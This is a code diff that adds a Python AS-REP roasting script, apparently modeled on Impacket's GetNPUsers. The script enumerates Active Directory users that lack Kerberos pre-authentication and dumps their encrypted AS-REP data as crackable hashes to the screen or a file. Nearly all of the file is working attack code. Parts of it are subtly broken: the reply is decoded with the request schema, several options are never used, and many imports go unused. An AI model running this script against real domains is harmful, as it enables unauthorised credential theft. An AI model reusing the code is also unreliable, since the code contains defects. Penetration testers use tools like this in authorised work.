@@ -1,0 +1,170 @@
+#!/usr/bin/env python3
+# Copyright (c) 2013-2022 Core Security Technologies
+#
+# This script will attempt to find user accounts that have the DONT_REQUIRE_PREAUTH
+# flag set (e.g. users that don't require Kerberos pre-authentication). If the
+# target system is vulnerable, it will return valid TGTs enciphered with the
+# users' RC4-HMAC keys which can be brute-forced offline.
+#
+# Original idea from:
+# https://www.blackhat.com/docs/us-15/materials/us-15-Campbell-AD-Visory-Exploiting-Windows-Active-Directory-Vulnerabilities-wp.pdf
+#
+# Authors:
+#  Alberto Solino (@agsolino)
+#
+# Reference for:
+#  SMB, DCERPC, Kerberos
+#
+# This software is provided under a slightly modified version
+# of the Apache Software License. See the accompanying LICENSE file
+# for more information.
+#
+import sys
+import logging
+from impacket import version
+from impacket.examples import logger
+from impacket.examples.utils import parse_target
+from impacket.krb5.asn1 import AS_REQ, KDC_ERR_PREAUTH_REQUIRED
+from impacket.krb5 import constants
+from impacket.krb5.types import Principal
+from pyasn1.codec.der import encoder, decoder
+from pyasn1.type.univ import noValue
+from impacket.krb5.kerberosv5 import sendReceive
+from impacket.krb5 import getKerberosTGT
+from impacket.krb5.crypto import Key
+from impacket.krb5.constants import EncryptionTypes
+from impacket.krb5.pac import PKERB_SID_AND_ATTRIBUTES
+from impacket.krb5.asn1 import KDC_REQ_BODY, PrincipalName, HostAddress, \
+    KDCOptions, PA_DATA, KerberosTime, KDC_REQ
+from impacket.krb5.types import KerberosTime, Principal
+from impacket.krb5.ccache import CCache
+from impacket.dcerpc.v5.dtypes import NULL
+from impacket.dcerpc.v5 import transport
+from impacket.dcerpc.v5.samr import DCERPCSessionError
+from impacket.examples.secretsdump import RemoteOperations, SAMHashes
+from impacket.smbconnection import SMBConnection
+import datetime
+import optparse
+import os
+import struct
+import time
+from binascii import hexlify
+
+class GetNPUsers:
+    def __init__(self, target, usersFile=None, outputFile=None, noPass=False, requestTGT=False, hashes=None, kdcHost=None):
+        self.__usersFile = usersFile
+        self.__outputFile = outputFile
+        self.__noPass = noPass
+        self.__requestTGT = requestTGT
+        self.__target = target
+        self.__domain, self.__username, self.__password, self.__address = parse_target(target)
+        self.__kdcHost = kdcHost
+        self.__hashes = hashes
+
+        if self.__username is None and usersFile is None:
+            raise Exception('You must specify a username or provide a file with users')
+
+        if self.__username is not None and usersFile is not None:
+            raise Exception('You must either specify a username or a file with users, not both')
+
+    def run(self):
+        from impacket.krb5.kerberosv5 import sendReceive
+        from impacket.krb5.asn1 import AS_REQ, KDC_REQ_BODY, PrincipalName, KDCOptions
+        from impacket.krb5.constants import EncryptionTypes
+        from pyasn1.codec.der import encoder
+
+        if self.__usersFile is not None:
+            with open(self.__usersFile) as f:
+                users = f.read().splitlines()
+        else:
+            users = [self.__username]
+
+        for user in users:
+            user = user.strip()
+            if not user:
+                continue
+
+            try:
+                logging.info(f'Testing user {user}')
+                requestUser = Principal(user, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
+                asReq = AS_REQ()
+
+                asReq['pvno'] = 5
+                asReq['msg-type'] = int(constants.ApplicationTagNumbers.AS_REQ.value)
+
+                opts = []
+                opts.append(constants.KDCOptions.forwardable.value)
+                opts.append(constants.KDCOptions.renewable.value)
+                opts.append(constants.KDCOptions.proxiable.value)
+
+                reqBody = KDC_REQ_BODY()
+                reqBody['kdc-options'] = constants.encodeFlags(opts)
+                reqBody['cname'] = PrincipalName()
+                reqBody['cname']['name-string'] = [user]
+                reqBody['cname']['name-type'] = constants.PrincipalNameType.NT_PRINCIPAL.value
+                reqBody['realm'] = self.__domain.upper()
+                reqBody['sname'] = PrincipalName()
+                reqBody['sname']['name-string'] = ['krbtgt', self.__domain.upper()]
+                reqBody['sname']['name-type'] = constants.PrincipalNameType.NT_SRV_INST.value
+
+                now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
+                reqBody['till'] = KerberosTime.to_asn1(now)
+                reqBody['nonce'] = int.from_bytes(os.urandom(4), byteorder='big')
+                reqBody['etype'] = [EncryptionTypes.rc4_hmac.value]
+
+                asReq['req-body'] = reqBody
+
+                message = encoder.encode(asReq)
+
+                try:
+                    r = sendReceive(message, self.__domain, self.__kdcHost)
+                except Exception as e:
+                    if 'KDC_ERR_PREAUTH_REQUIRED' in str(e):
+                        logging.debug(f'User {user} does require pre-authentication. Skipping...')
+                    else:
+                        logging.debug(f'Error sending request for user {user}: {e}')
+                    continue
+
+                logging.success(f'User {user} does NOT require pre-authentication. Dumping hash.')
+
+                encTicketPart = decoder.decode(r, asn1Spec=AS_REQ())[0]
+                cipher = encTicketPart['enc-part']['cipher']
+                encData = hexlify(cipher.asOctets()).decode('utf-8')
+
+                hashLine = f'$krb5asrep${user}@{self.__domain}:{encData}'
+                print(hashLine)
+
+                if self.__outputFile:
+                    with open(self.__outputFile, 'a') as of:
+                        of.write(f'{hashLine}\n')
+
+            except Exception as e:
+                logging.debug(f'Unexpected error for user {user}: {str(e)}')
+
+# Main
+if __name__ == '__main__':
+    logger.init()
+    print(version.BANNER)
+
+    parser = optparse.OptionParser(usage="usage: %prog [options] target\n\n"
+                                         "Example: %prog -usersfile users.txt -no-pass -dc-ip 10.0.0.1 TEST/")
+    parser.add_option("-usersfile", help="File with usernames, one per line", dest='usersfile')
+    parser.add_option("-outputfile", help="Write hashes to this file", dest='outputfile')
+    parser.add_option("-no-pass", action="store_true", help="Don't ask for password (useful for AS-REP roasting)")
+    parser.add_option("-request-tgt", action="store_true", help="Request TGT")
+    parser.add_option("-dc-ip", help="Domain Controller IP address", dest='dc_ip')
+    parser.add_option("-hashes", help="NTLM hashes, format is LMHASH:NTHASH", dest="hashes")
+
+    (options, args) = parser.parse_args()
+
+    if len(args) != 1:
+        parser.print_help()
+        sys.exit(1)
+
+    try:
+        dumper = GetNPUsers(args[0], usersFile=options.usersfile, outputFile=options.outputfile,
+                            noPass=options.no_pass, requestTGT=options.request_tgt,
+                            hashes=options.hashes, kdcHost=options.dc_ip)
+        dumper.run()
+    except Exception as e:
+        logging.critical(str(e))
